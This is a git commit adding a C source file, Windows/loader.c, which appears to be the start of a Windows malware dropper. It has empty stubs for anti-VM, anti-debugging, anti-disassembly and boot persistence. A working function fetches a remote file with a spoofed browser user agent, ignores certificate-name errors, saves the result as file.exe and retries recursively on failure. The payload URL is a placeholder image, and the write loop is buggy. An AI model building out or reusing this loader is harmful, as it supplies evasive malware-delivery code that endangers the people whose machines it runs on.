aed44f4cb6ea5de16d965a078807c2829bf24874
kl43s <58507201+kl43s@users.noreply.github.com>
2021-10-25 21:31:13 +0200

    Add files via upload

---
+++ Windows/loader.c
@@ -0,0 +1,50 @@
+#include <Windows.h>
+#include <Lmcons.h>
+#include <wchar.h>
+#include <stdio.h>
+#include <winreg.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <dirent.h>
+#include <stdlib.h>
+#include <string.h>
+#include <wininet.h>
+
+#define BUFSIZE MAX_PATH
+
+int antiVM(){}
+int antiDebug(){}
+int antiDisasm(){}
+int startBoot(){}
+int checkInternet(){
+    
+}
+
+int loader(){
+    char url[BUFSIZE] = "https://www.algosecure.fr/img/illustrations/investigation-forensic-cover.jpg";
+    char buff[BUFSIZE];
+    DWORD bytesRead;
+    HANDLE hdl, hdl2;
+    hdl = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (hdl != NULL){
+        hdl2 = InternetOpenUrlA(hdl, url, 0, 0, INTERNET_FLAG_IGNORE_CERT_CN_INVALID, 0);
+        if (hdl2 != NULL){
+            FILE * file = fopen("file.exe", "w");
+            do {
+                BOOL hdl3 = InternetReadFile(hdl2, buff, sizeof(buff), &bytesRead);
+                fwrite(buff, sizeof(buff), 1, file);
+
+            } while (bytesRead > 0);
+            fclose(file);
+        } else loader();
+    } else loader();
+
+    InternetCloseHandle(hdl);
+	InternetCloseHandle(hdl2);
+
+}
+
+int main(){
+    loader();
+    return 0;
+}
